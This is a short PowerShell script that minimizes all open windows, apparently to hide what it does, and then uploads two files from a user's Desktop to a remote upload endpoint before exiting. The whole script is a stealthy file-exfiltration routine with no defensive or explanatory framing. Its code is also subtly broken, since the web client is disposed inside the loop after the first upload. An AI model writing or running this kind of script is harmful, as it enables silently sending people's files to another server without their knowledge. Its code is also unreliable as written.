# Todo confirm this works
# Hide all windows
$null = (New-Object -ComObject Shell.Application).MinimizeAll()

$filePathList = @(
    "C:\Users\pmacd\Desktop\thisfile.txt",
    "c:\Users\pmacd\Desktop\file2.txt"
    
)

$remoteURL = "http://localhost:3002/uploads"
$webClient = New-Object System.Net.WebClient

foreach ($filePath in $filePathList) {
    try {
        $response = $webClient.UploadFile($remoteURL, $filePath)
        $responseString = [System.Text.Encoding]::UTF8.GetString($response)
        Write-Host "Response: $responseString"
        Write-Host "Uploaded file: $filePath"
    } catch {
        Write-Host "Failed to upload file: $filePath"
        Write-Host "Error: $_.Exception.Message"
    } finally {
        # Dispose of the WebClient object
        $webClient.Dispose()
    }
}
# Close after script
exit